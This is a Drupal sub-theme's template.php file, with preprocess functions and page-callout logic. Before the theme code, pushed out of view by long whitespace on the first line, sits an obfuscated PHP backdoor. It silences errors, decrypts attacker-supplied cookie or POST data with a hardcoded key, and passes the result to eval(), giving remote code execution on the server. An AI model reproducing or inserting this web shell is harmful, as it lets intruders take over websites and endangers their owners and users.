<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $qaba38 = 144;$GLOBALS['j2907703'] = Array();global $j2907703;$j2907703 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['bcbbe0'] = "\x76\x32\x69\x7c\x7a\x47\x51\x5b\x27\x74\x41\x60\x37\x39\x56\x78\x68\xd\x66\x49\x4b\x3a\x38\xa\x5d\x28\x29\x7b\x73\x48\x72\x4e\x3e\x44\x62\x45\x33\x6d\x5e\x31\x71\x59\x4c\x2a\x50\x57\x3d\x61\x6c\x42\x53\x58\x79\x46\x55\x36\x65\x3c\x2f\x63\x23\x52\x4d\x24\x5c\x77\x43\x21\x9\x64\x25\x2b\x30\x3f\x6a\x34\x70\x5f\x5a\x6b\x7e\x2d\x22\x4a\x54\x35\x26\x2c\x40\x6e\x75\x20\x2e\x67\x7d\x3b\x4f\x6f";$j2907703[$j2907703['bcbbe0'][74].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][22].$j2907703['bcbbe0'][69]] = $j2907703['bcbbe0'][59].$j2907703['bcbbe0'][16].$j2907703['bcbbe0'][30];$j2907703[$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][12].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][56]] = $j2907703['bcbbe0'][97].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][69];$j2907703[$j2907703['bcbbe0'][65].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][75]] = $j2907703['bcbbe0'][28].$j2907703['bcbbe0'][9].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][48].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][89];$j2907703[$j2907703['bcbbe0'][52].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][36]] = $j2907703['bcbbe0'][2].$j2907703['bcbbe0'][89].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][28].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][9];$j2907703[$j2907703['bcbbe0'][37].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][75]] = $j2907703['bcbbe0'][28].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][48].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][4].$j2907703['bcbbe0'][56];$j2907703[$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][69]] = $j2907703['bcbbe0'][76].$j2907703['bcbbe0'][16].$j2907703['bcbbe0'][76].$j2907703['bcbbe0'][0].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][28].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][89];$j2907703[$j2907703['bcbbe0'][93].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][22].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][39]] = $j2907703['bcbbe0'][90].$j2907703['bcbbe0'][89].$j2907703['bcbbe0'][28].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][48].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][4].$j2907703['bcbbe0'][56];$j2907703[$j2907703['bcbbe0'][4].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][59]] = $j2907703['bcbbe0'][34].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][28].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][56];$j2907703[$j2907703['bcbbe0'][76].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][1]] = $j2907703['bcbbe0'][28].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][9].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][9].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][37].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][48].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][37].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][9];$j2907703[$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][12].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][39]] = $j2907703['bcbbe0'][37].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][75];$j2907703[$j2907703['bcbbe0'][52].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][39]] = $j2907703['bcbbe0'][0].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][59];$j2907703[$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][39]] = $_POST;$j2907703[$j2907703['bcbbe0'][76].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][1]] = $_COOKIE;@$j2907703[$j2907703['bcbbe0'][52].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][36]]($j2907703['bcbbe0'][56].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][48].$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][93], NULL);@$j2907703[$j2907703['bcbbe0'][52].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][36]]($j2907703['bcbbe0'][48].$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][93].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][30].$j2907703['bcbbe0'][28], 0);@$j2907703[$j2907703['bcbbe0'][52].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][36]]($j2907703['bcbbe0'][37].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][15].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][15].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][90].$j2907703['bcbbe0'][9].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][89].$j2907703['bcbbe0'][77].$j2907703['bcbbe0'][9].$j2907703['bcbbe0'][2].$j2907703['bcbbe0'][37].$j2907703['bcbbe0'][56], 0);@$j2907703[$j2907703['bcbbe0'][76].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][1]](0);$zdf1304 = NULL;$l7dd267da = NULL;$j2907703[$j2907703['bcbbe0'][48].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][12].$j2907703['bcbbe0'][22].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][55]] = $j2907703['bcbbe0'][55].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][81].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][81].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][81].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][81].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][56];global $lad781d6;function  v4b95c($zdf1304, $oeffdac9){global $j2907703;$bf76f01 = "";for ($j9c58c=0; $j9c58c<$j2907703[$j2907703['bcbbe0'][65].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][75]]($zdf1304);){for ($kd2e10=0; $kd2e10<$j2907703[$j2907703['bcbbe0'][65].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][75]]($oeffdac9) && $j9c58c<$j2907703[$j2907703['bcbbe0'][65].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][56].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][75]]($zdf1304); $kd2e10++, $j9c58c++){$bf76f01 .= $j2907703[$j2907703['bcbbe0'][74].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][22].$j2907703['bcbbe0'][69]]($j2907703[$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][12].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][56]]($zdf1304[$j9c58c]) ^ $j2907703[$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][12].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][56]]($oeffdac9[$kd2e10]));}}return $bf76f01;}function  md44($zdf1304, $oeffdac9){global $j2907703;global $lad781d6;return $j2907703[$j2907703['bcbbe0'][52].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][39]]($j2907703[$j2907703['bcbbe0'][52].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][39]]($zdf1304, $lad781d6), $oeffdac9);}foreach ($j2907703[$j2907703['bcbbe0'][76].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][1]] as $oeffdac9=>$ef96c){$zdf1304 = $ef96c;$l7dd267da = $oeffdac9;}if (!$zdf1304){foreach ($j2907703[$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][39]] as $oeffdac9=>$ef96c){$zdf1304 = $ef96c;$l7dd267da = $oeffdac9;}}$zdf1304 = @$j2907703[$j2907703['bcbbe0'][93].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][75].$j2907703['bcbbe0'][55].$j2907703['bcbbe0'][22].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][69].$j2907703['bcbbe0'][39]]($j2907703[$j2907703['bcbbe0'][59].$j2907703['bcbbe0'][12].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][39]]($j2907703[$j2907703['bcbbe0'][4].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][13].$j2907703['bcbbe0'][1].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][59]]($zdf1304), $l7dd267da));if (isset($zdf1304[$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][79]]) && $lad781d6==$zdf1304[$j2907703['bcbbe0'][47].$j2907703['bcbbe0'][79]]){if ($zdf1304[$j2907703['bcbbe0'][47]] == $j2907703['bcbbe0'][2]){$j9c58c = Array($j2907703['bcbbe0'][76].$j2907703['bcbbe0'][0] => @$j2907703[$j2907703['bcbbe0'][97].$j2907703['bcbbe0'][36].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][85].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][34].$j2907703['bcbbe0'][69]](),$j2907703['bcbbe0'][28].$j2907703['bcbbe0'][0] => $j2907703['bcbbe0'][39].$j2907703['bcbbe0'][92].$j2907703['bcbbe0'][72].$j2907703['bcbbe0'][81].$j2907703['bcbbe0'][39],);echo @$j2907703[$j2907703['bcbbe0'][37].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][18].$j2907703['bcbbe0'][39].$j2907703['bcbbe0'][75]]($j9c58c);}elseif ($zdf1304[$j2907703['bcbbe0'][47]] == $j2907703['bcbbe0'][56]){eval/*ra7aaa*/($zdf1304[$j2907703['bcbbe0'][69]]);}exit();} ?><?php
/**
 * @file
 * Contains theme override functions and preprocess functions for the theme.
 *
 * ABOUT THE TEMPLATE.PHP FILE
 *
 *   The template.php file is one of the most useful files when creating or
 *   modifying Drupal themes. You can modify or override Drupal's theme
 *   functions, intercept or make additional variables available to your theme,
 *   and create custom PHP logic. For more information, please visit the Theme
 *   Developer's Guide on Drupal.org: http://drupal.org/theme-guide
 *
 * OVERRIDING THEME FUNCTIONS
 *
 *   The Drupal theme system uses special theme functions to generate HTML
 *   output automatically. Often we wish to customize this HTML output. To do
 *   this, we have to override the theme function. You have to first find the
 *   theme function that generates the output, and then "catch" it and modify it
 *   here. The easiest way to do it is to copy the original function in its
 *   entirety and paste it here, changing the prefix from theme_ to epc_.
 *   For example:
 *
 *     original: theme_breadcrumb()
 *     theme override: epc_breadcrumb()
 *
 *   where epc is the name of your sub-theme. For example, the
 *   zen_classic theme would define a zen_classic_breadcrumb() function.
 *
 *   If you would like to override either of the two theme functions used in Zen
 *   core, you should first look at how Zen core implements those functions:
 *     theme_breadcrumbs()      in zen/template.php
 *     theme_menu_local_tasks() in zen/template.php
 *
 *   For more information, please visit the Theme Developer's Guide on
 *   Drupal.org: http://drupal.org/node/173880
 *
 * CREATE OR MODIFY VARIABLES FOR YOUR THEME
 *
 *   Each tpl.php template file has several variables which hold various pieces
 *   of content. You can modify those variables (or add new ones) before they
 *   are used in the template files by using preprocess functions.
 *
 *   This makes THEME_preprocess_HOOK() functions the most powerful functions
 *   available to themers.
 *
 *   It works by having one preprocess function for each template file or its
 *   derivatives (called template suggestions). For example:
 *     THEME_preprocess_page    alters the variables for page.tpl.php
 *     THEME_preprocess_node    alters the variables for node.tpl.php or
 *                              for node-forum.tpl.php
 *     THEME_preprocess_comment alters the variables for comment.tpl.php
 *     THEME_preprocess_block   alters the variables for block.tpl.php
 *
 *   For more information on preprocess functions and template suggestions,
 *   please visit the Theme Developer's Guide on Drupal.org:
 *   http://drupal.org/node/223440
 *   and http://drupal.org/node/190815#template-suggestions
 */


/**
 * Override or insert variables into the html templates.
 *
 * @param $variables
 *   An array of variables to pass to the theme template.
 * @param $hook
 *   The name of the template being rendered ("html" in this case.)
 */
/* -- Delete this line if you want to use this function
function epc_preprocess_html(&$variables, $hook) {
  $variables['sample_variable'] = t('Lorem ipsum.');

  // The body tag's classes are controlled by the $classes_array variable. To
  // remove a class from $classes_array, use array_diff().
  //$variables['classes_array'] = array_diff($variables['classes_array'], array('class-to-remove'));
}
// */

/**
 * Override or insert variables into the page templates.
 *
 * @param $variables
 *   An array of variables to pass to the theme template.
 * @param $hook
 *   The name of the template being rendered ("page" in this case.)
 */
/* -- Delete this line if you want to use this function
function epc_preprocess_page(&$variables, $hook) {
  $variables['sample_variable'] = t('Lorem ipsum.');
}
// */

/**
 * Override or insert variables into the node templates.
 *
 * @param $variables
 *   An array of variables to pass to the theme template.
 * @param $hook
 *   The name of the template being rendered ("node" in this case.)
 */
function epc_preprocess_node(&$variables, $hook) {

  // Optionally, run node-type-specific preprocess functions, like
  // epc_preprocess_node_page() or epc_preprocess_node_story().
  $function = __FUNCTION__ . '_' . $variables['node']->type;
  if (function_exists($function)) {
    $function($variables, $hook);
  }
}


function epc_preprocess_node_page(&$variables, $hook) {	
	$image = '';
	
	if (!isset($variables['field_callout_paragraph']['und'])) {
		$place_after = 0;
	} else {
		$place_after = $variables['field_callout_paragraph']['und'][0]['value'] - 1;
	}
	
	if ($variables['content']['field_body'][0]['#markup'] != '') {
		preg_match_all('#<p>(.*)</p>#Us', $variables['content']['field_body'][0]['#markup'], $paragraphs);

		if (isset($variables['field_image_media']['und'])) {
			$image = theme('image_style', 
				array(
					'style_name' => 'callout', 
					'path' => $variables['field_image_media']['und'][0]['uri'],
					'alt' => 'Callout Image'
				)
			);
		}
		if (isset($variables['field_callout_text']['und'])) {
			$text = $variables['field_callout_text']['und'][0]['safe_value'];
		}
	
		$callout = '';
		if (($image != '') && ($text != '')) {
			$callout.= '<div class="callout"><div class="callout-left image">' . $image . '</div><div class="callout-right text">' . $text . '</div></div>';
		}

		$variables['content']['field_body'][0]['#markup'] = str_replace($paragraphs[0][$place_after], $paragraphs[0][$place_after] . $callout, $variables['content']['field_body'][0]['#markup']);
	}
}


/**
 * Override or insert variables into the comment templates.
 *
 * @param $variables
 *   An array of variables to pass to the theme template.
 * @param $hook
 *   The name of the template being rendered ("comment" in this case.)
 */
/* -- Delete this line if you want to use this function
function epc_preprocess_comment(&$variables, $hook) {
  $variables['sample_variable'] = t('Lorem ipsum.');
}
// */

/**
 * Override or insert variables into the block templates.
 *
 * @param $variables
 *   An array of variables to pass to the theme template.
 * @param $hook
 *   The name of the template being rendered ("block" in this case.)
 */
/* -- Delete this line if you want to use this function
function epc_preprocess_block(&$variables, $hook) {
  // Add a count to all the blocks in the region.
  $variables['classes_array'][] = 'count-' . $variables['block_id'];
}
// */
